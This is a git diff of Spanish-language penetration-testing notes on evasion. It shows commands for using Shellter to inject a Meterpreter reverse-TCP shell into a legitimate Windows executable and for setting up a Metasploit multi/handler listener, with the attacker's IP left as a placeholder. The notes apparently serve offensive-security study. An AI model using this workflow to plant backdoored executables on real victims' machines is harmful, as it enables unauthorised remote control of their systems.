@@ -26,9 +26,9 @@ Técnicas de evasión en memoria:
 
 ## Shellter
 
-Nos ayuda a inyectar una ReverShell en un archivo legitimo ejecutables en Windows.
-
 ```bash 
+# Shellter ayuda a inyectar una ReverShell en un archivo legitimo ejecutables en Windows.
+
 ❯ apt install shellter                             # Instalamos Shellter, Shellter solo soporta 32 bit Payload
 ❯ apt install wine32
 ❯ dpkg --add-architecture i386 
@@ -45,6 +45,17 @@ Nos ayuda a inyectar una ReverShell en un archivo legitimo ejecutables en Window
 	❯ 1                                           # Escogemos la opcion 1 (Meterpreter_Reverse_tcp)
 	❯ <IP>                                        # Set LHOST del atacate
 	❯ 443                                         # Set LPORT del atacante
+
+# Solo debemos de pasar el nuevo archivo .exe a la maquina victima y ejecutarlo para obtener la Revershell. 
 ```
 
-Solo debemos de pasar el nuevo archivo .exe a la maquina victima y ejecutarlo para obtener la Revershell. 
+## Revershell Metasploit
+
+```bash 
+# Configuracion para recibir la conexion de la revershell
+
+❯ use multi/handler 
+	❯ set payload windows/meterpreter/reverse_tcp
+	❯ set LHOST <IP>
+	❯ set LPORT 443 
+```
